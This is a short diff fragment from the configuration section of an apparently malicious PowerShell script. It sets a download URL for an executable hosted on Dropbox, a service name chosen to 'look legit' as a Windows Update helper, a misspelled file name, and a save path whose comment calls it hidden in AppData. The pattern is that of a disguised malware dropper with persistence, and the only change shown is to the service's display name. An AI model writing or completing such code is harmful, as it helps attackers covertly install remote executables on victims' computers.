@@ -18,7 +18,7 @@
 # --- CONFIGURATION (EDIT THESE) ---
 $DownloadUrl = "https://www.dropbox.com/scl/fi/8sd2wb7b6kjak2riqm7ze/wmchost.exe?rlkey=q9o1dkt2dmtiob1afp0gu3m4g&st=bd0sspjh&dl=1"   # REPLACE THIS with your direct download link
 $ServiceName = "WindowsUpdateHelper"                 # Name of the service (Make it look legit)
-$DisplayName = "Windows Update Helper Service"       # Display name in Services.msc
+$DisplayName = "xWindows Update Helper Service"       # Display name in Services.msc
 $Description = "Keeps your Windows system up to date." # Description for the service
 $FileName    = "servies.exe"                         # Name of the executable file on disk
 $DestPath    = "$env:APPDATA\$FileName"              # Save location (Hidden in AppData)
